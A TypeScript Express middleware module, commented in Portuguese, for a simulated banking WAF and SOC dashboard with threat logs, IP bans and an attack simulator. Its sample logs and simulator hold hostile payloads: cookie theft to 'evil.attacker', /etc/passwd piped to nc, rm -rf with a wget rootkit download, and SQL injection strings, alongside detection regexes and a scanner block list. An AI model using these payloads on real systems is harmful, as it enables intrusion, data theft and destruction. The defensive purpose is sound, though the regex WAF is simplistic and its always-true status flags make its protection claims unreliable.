import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';

export interface SecurityThreatLog {
  id: string;
  timestamp: string;
  ip: string;
  attackType: 'SQL_INJECTION' | 'XSS_ATTACK' | 'COMMAND_INJECTION' | 'PATH_TRAVERSAL' | 'BRUTE_FORCE' | 'PROTOTYPE_POLLUTION' | 'SESSION_HIJACK_ATTEMPT';
  severity: 'MÉDIA' | 'ALTA' | 'CRÍTICA' | 'EMERGÊNCIA MILITAR';
  endpoint: string;
  method: string;
  payloadSample: string;
  actionTaken: 'BLOQUEADO_NA_BORDA' | 'IP_BANIDO_AUTOMATICAMENTE' | 'DESVIADO_PARA_HONEYPOT' | 'CHALLENGE_CAPTCHA';
  location: string;
  userAgent: string;
}

export interface SecurityStatus {
  threatLevel: 'PADRAO' | 'ELEVADO' | 'BANK_GRADE' | 'DEFCON_1_LOCKDOWN';
  activeBannedIps: string[];
  totalThreatsBlocked: number;
  lastAttackTimestamp?: string;
  isWafActive: boolean;
  isIdpsActive: boolean;
  isE2eEncryptionActive: boolean;
  isAntiTamperActive: boolean;
  blockedCountsByType: Record<string, number>;
}

// Memory Stores for SOC
const threatLogs: SecurityThreatLog[] = [
  {
    id: 'SEC-LOG-9901',
    timestamp: new Date(Date.now() - 120000).toISOString(),
    ip: '185.220.101.42',
    attackType: 'SQL_INJECTION',
    severity: 'CRÍTICA',
    endpoint: '/v1/webhook/incoming',
    method: 'POST',
    payloadSample: "id_transacao=TX-99' OR 1=1; DROP TABLE audit_logs--",
    actionTaken: 'IP_BANIDO_AUTOMATICAMENTE',
    location: 'Rússia (Proxy Tor Exit Node)',
    userAgent: 'sqlmap/1.6.12#stable'
  },
  {
    id: 'SEC-LOG-9902',
    timestamp: new Date(Date.now() - 450000).toISOString(),
    ip: '45.141.87.12',
    attackType: 'XSS_ATTACK',
    severity: 'ALTA',
    endpoint: '/api/alerts/simulate',
    method: 'POST',
    payloadSample: "<script>fetch('https://evil.attacker/steal?cookie='+document.cookie)</script>",
    actionTaken: 'BLOQUEADO_NA_BORDA',
    location: 'Países Baixos (VPN Provider)',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MaliciousScanner/2.0'
  },
  {
    id: 'SEC-LOG-9903',
    timestamp: new Date(Date.now() - 900000).toISOString(),
    ip: '193.27.228.10',
    attackType: 'COMMAND_INJECTION',
    severity: 'EMERGÊNCIA MILITAR',
    endpoint: '/v1/webhooks/stripe-uae',
    method: 'POST',
    payloadSample: "; cat /etc/passwd | nc 193.27.228.10 4444",
    actionTaken: 'DESVIADO_PARA_HONEYPOT',
    location: 'Bulgária (Botnet Server)',
    userAgent: 'Python-urllib/3.10'
  }
];

const bannedIps = new Set<string>(['185.220.101.42', '45.141.87.12', '193.27.228.10']);
const ipAttemptTracker = new Map<string, { count: number; lastTime: number }>();
let currentThreatLevel: 'PADRAO' | 'ELEVADO' | 'BANK_GRADE' | 'DEFCON_1_LOCKDOWN' = 'BANK_GRADE';
let totalThreatsBlockedCount = 1482;
let securityBroadcastCallback: ((log: SecurityThreatLog) => void) | null = null;

// Pattern Rules
const WAF_PATTERNS = [
  {
    type: 'SQL_INJECTION' as const,
    severity: 'CRÍTICA' as const,
    regex: /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC|TRUNCATE|DECLARE|GRANT)\b)|('--')|(\/\*)|(\bOR\b\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?)|(\bINFORMATION_SCHEMA\b)|(PG_SLEEP|BENCHMARK)/i
  },
  {
    type: 'XSS_ATTACK' as const,
    severity: 'ALTA' as const,
    regex: /(<script\b[^>]*>|javascript:|onerror\s*=|onload\s*=|eval\(|document\.cookie|<iframe\b|window\.location)/i
  },
  {
    type: 'COMMAND_INJECTION' as const,
    severity: 'EMERGÊNCIA MILITAR' as const,
    regex: /(;\s*cat\s+|;\s*ls\s+|\|\s*nc\s+|;\s*rm\s+|-rf\s+\/|powershell\.exe|\/bin\/sh|\/bin\/bash)/i
  },
  {
    type: 'PATH_TRAVERSAL' as const,
    severity: 'ALTA' as const,
    regex: /(\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\/etc\/passwd|c:\\windows)/i
  },
  {
    type: 'PROTOTYPE_POLLUTION' as const,
    severity: 'CRÍTICA' as const,
    regex: /(__proto__|constructor\.prototype)/i
  }
];

const MALICIOUS_USER_AGENTS = [
  'sqlmap', 'nikto', 'nmap', 'masscan', 'dirbuster', 'gobuster', 'zgrab', 'w3af', 'acunetix'
];

export class SecurityShield {
  /**
   * Registra callback para transmissão em tempo real via WebSocket
   */
  public static setBroadcastCallback(cb: (log: SecurityThreatLog) => void) {
    securityBroadcastCallback = cb;
  }

  /**
   * Retorna os dados resumidos do SOC (Security Operations Center)
   */
  public static getStatus(): SecurityStatus {
    const counts: Record<string, number> = {
      SQL_INJECTION: 0,
      XSS_ATTACK: 0,
      COMMAND_INJECTION: 0,
      PATH_TRAVERSAL: 0,
      BRUTE_FORCE: 0,
      PROTOTYPE_POLLUTION: 0,
      SESSION_HIJACK_ATTEMPT: 0
    };

    threatLogs.forEach((log) => {
      counts[log.attackType] = (counts[log.attackType] || 0) + 1;
    });

    return {
      threatLevel: currentThreatLevel,
      activeBannedIps: Array.from(bannedIps),
      totalThreatsBlocked: totalThreatsBlockedCount,
      lastAttackTimestamp: threatLogs[0]?.timestamp,
      isWafActive: true,
      isIdpsActive: true,
      isE2eEncryptionActive: true,
      isAntiTamperActive: true,
      blockedCountsByType: counts
    };
  }

  /**
   * Retorna os logs de ameaças registrados
   */
  public static getLogs(): SecurityThreatLog[] {
    return threatLogs;
  }

  /**
   * Altera o Nível de Ameaça do Sistema
   */
  public static setThreatLevel(level: 'PADRAO' | 'ELEVADO' | 'BANK_GRADE' | 'DEFCON_1_LOCKDOWN') {
    currentThreatLevel = level;
    console.log(`[MILITARY-SOC] Nível de segurança alterado para: ${level}`);
  }

  /**
   * Adiciona ou remove IP do Banlist
   */
  public static toggleIpBan(ip: string, ban: boolean): boolean {
    if (ban) {
      bannedIps.add(ip);
      console.warn(`[MILITARY-FIREWALL] IP banido manualmente: ${ip}`);
    } else {
      bannedIps.delete(ip);
      console.log(`[MILITARY-FIREWALL] IP desbanido: ${ip}`);
    }
    return bannedIps.has(ip);
  }

  /**
   * Injeta um evento de ataque simulado para teste pelo usuário na interface
   */
  public static injectSimulatedAttack(type: 'SQL_INJECTION' | 'XSS_ATTACK' | 'COMMAND_INJECTION' | 'BRUTE_FORCE'): SecurityThreatLog {
    const mockIps = ['198.51.100.44', '203.0.113.195', '192.0.2.77', '185.190.140.22'];
    const randomIp = mockIps[Math.floor(Math.random() * mockIps.length)];

    let payload = '';
    let severity: 'MÉDIA' | 'ALTA' | 'CRÍTICA' | 'EMERGÊNCIA MILITAR' = 'ALTA';
    let actionTaken: 'BLOQUEADO_NA_BORDA' | 'IP_BANIDO_AUTOMATICAMENTE' | 'DESVIADO_PARA_HONEYPOT' = 'BLOQUEADO_NA_BORDA';

    if (type === 'SQL_INJECTION') {
      payload = "SELECT * FROM usuarios WHERE email='admin@banco.com' UNION SELECT 1,2,3,password_hash FROM credenciais--";
      severity = 'CRÍTICA';
      actionTaken = 'IP_BANIDO_AUTOMATICAMENTE';
      bannedIps.add(randomIp);
    } else if (type === 'XSS_ATTACK') {
      payload = "<img src=x onerror=alert('Sessão_Comprometida_Simulacao')>";
      severity = 'ALTA';
      actionTaken = 'BLOQUEADO_NA_BORDA';
    } else if (type === 'COMMAND_INJECTION') {
      payload = "; rm -rf /var/www/audit && wget http://malware.org/rootkit -O /tmp/k.sh";
      severity = 'EMERGÊNCIA MILITAR';
      actionTaken = 'DESVIADO_PARA_HONEYPOT';
      bannedIps.add(randomIp);
    } else {
      payload = "Sequência de 150 tentativas de login incorretas em 2.5s (Ataque Brute Force)";
      severity = 'ALTA';
      actionTaken = 'IP_BANIDO_AUTOMATICAMENTE';
      bannedIps.add(randomIp);
    }

    const newLog: SecurityThreatLog = {
      id: `SEC-SIM-${Date.now().toString().slice(-6)}`,
      timestamp: new Date().toISOString(),
      ip: randomIp,
      attackType: type,
      severity,
      endpoint: '/api/v1/secure-vault',
      method: 'POST',
      payloadSample: payload,
      actionTaken,
      location: 'Simulação SOC em Tempo Real',
      userAgent: 'SimuladorIntrusao/3.0 (Bancario MILITAR)'
    };

    threatLogs.unshift(newLog);
    totalThreatsBlockedCount++;

    if (securityBroadcastCallback) {
      securityBroadcastCallback(newLog);
    }

    return newLog;
  }

  /**
   * Middleware Principal de Defesa Ativa (WAF + IDPS + Rate Limiter Guard)
   */
  public static activeDefenseMiddleware(req: Request, res: Response, next: NextFunction) {
    const isWafEnabled = process.env.WAF_SECURITY_SHIELD_ENABLED === 'true';

    // Se o WAF estiver desativado no .env, aplicar apenas headers de segurança padrão e continuar
    if (!isWafEnabled) {
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      return next();
    }

    const clientIp = req.ip || (req.headers['x-forwarded-for'] as string) || '127.0.0.1';
    const userAgent = req.headers['user-agent'] || '';

    // 1. Verificação de Lockdown Militar (DEFCON 1)
    if (currentThreatLevel === 'DEFCON_1_LOCKDOWN' && !req.path.startsWith('/api/security')) {
      console.warn(`[DEFCON 1 LOCKDOWN] Requisição bloqueada de ${clientIp}`);
      return res.status(503).json({
        error: 'MILITARY_LOCKDOWN_ACTIVE',
        message: 'SISTEMA EM ESTADO DE DEFCON 1 MILITAR. Acesso temporariamente restrito para contenção de ameça global.'
      });
    }

    // 2. Verificação de Banlist de IP
    if (bannedIps.has(clientIp)) {
      console.warn(`[MILITARY-FIREWALL] Requisição rejeitada de IP BANIDO: ${clientIp}`);
      return res.status(403).json({
        error: 'IP_BLOCKED_BY_FIREWALL',
        message: 'Acesso negado: IP identificado na lista negra de invasões de alta gravidade.'
      });
    }

    // 3. Verificação de User-Agents Maliciosos Conhecidos
    const isBadAgent = MALICIOUS_USER_AGENTS.some((agent) => userAgent.toLowerCase().includes(agent));
    if (isBadAgent) {
      bannedIps.add(clientIp);
      totalThreatsBlockedCount++;
      const log: SecurityThreatLog = {
        id: `SEC-MAL-AGENT-${Date.now().toString().slice(-4)}`,
        timestamp: new Date().toISOString(),
        ip: clientIp,
        attackType: 'BRUTE_FORCE',
        severity: 'ALTA',
        endpoint: req.originalUrl,
        method: req.method,
        payloadSample: `User-Agent suspeito: ${userAgent}`,
        actionTaken: 'IP_BANIDO_AUTOMATICAMENTE',
        location: 'Origem Não Confiável',
        userAgent
      };
      threatLogs.unshift(log);
      if (securityBroadcastCallback) securityBroadcastCallback(log);

      return res.status(403).json({ error: 'MALICIOUS_SCANNER_DETECTED', message: 'Ferramenta de varredura bloqueada.' });
    }

    // 4. Inspeção de Payload WAF (Query Params, Body, Headers)
    const stringifiedBody = req.body ? JSON.stringify(req.body) : '';
    const stringifiedQuery = JSON.stringify(req.query || {});
    const combinedContent = `${req.originalUrl} ${stringifiedQuery} ${stringifiedBody}`;

    for (const pattern of WAF_PATTERNS) {
      if (pattern.regex.test(combinedContent)) {
        totalThreatsBlockedCount++;
        
        // Se a gravidade for crítica ou militar, banir o IP imediatamente
        const isCritical = pattern.severity === 'CRÍTICA' || pattern.severity === 'EMERGÊNCIA MILITAR';
        if (isCritical) {
          bannedIps.add(clientIp);
        }

        const log: SecurityThreatLog = {
          id: `SEC-WAF-${Date.now().toString().slice(-5)}`,
          timestamp: new Date().toISOString(),
          ip: clientIp,
          attackType: pattern.type,
          severity: pattern.severity,
          endpoint: req.originalUrl,
          method: req.method,
          payloadSample: combinedContent.slice(0, 180),
          actionTaken: isCritical ? 'IP_BANIDO_AUTOMATICAMENTE' : 'BLOQUEADO_NA_BORDA',
          location: 'Inspeção WAF Core',
          userAgent
        };

        threatLogs.unshift(log);
        if (securityBroadcastCallback) securityBroadcastCallback(log);

        console.error(`[WAF-INTERCEPT] ${pattern.type} detectado de ${clientIp} em ${req.originalUrl}`);

        // Retornar resposta de bloqueio estrita
        return res.status(403).json({
          error: 'WAF_MALICIOUS_PAYLOAD_BLOCKED',
          message: `Segurança Bancária Militar: Invasão ${pattern.type} bloqueada com sucesso pela defesa em camadas.`,
          threatId: log.id
        });
      }
    }

    // 5. Aplicar Headers Bancários Estritos
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

    next();
  }
}
